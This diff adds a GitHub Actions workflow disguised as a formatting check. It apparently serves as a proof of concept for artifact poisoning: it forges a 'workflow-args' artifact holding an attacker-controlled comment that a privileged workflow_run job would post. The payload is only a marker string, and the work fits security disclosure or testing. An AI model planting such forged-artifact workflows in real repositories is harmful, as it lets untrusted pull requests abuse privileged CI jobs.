@@ -1,0 +1,19 @@
+name: "Check code formatting"
+
+permissions:
+  contents: read
+
+on:
+  pull_request:
+
+jobs:
+  code_formatter:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: Forge artifact (attacker controls contents)
+        run: |
+          printf '%s' '[{"body":"POC-CONFIRMED: attacker-controlled comment posted by the privileged workflow_run job"}]' > comments
+      - uses: actions/upload-artifact@v4
+        with:
+          name: workflow-args
+          path: comments
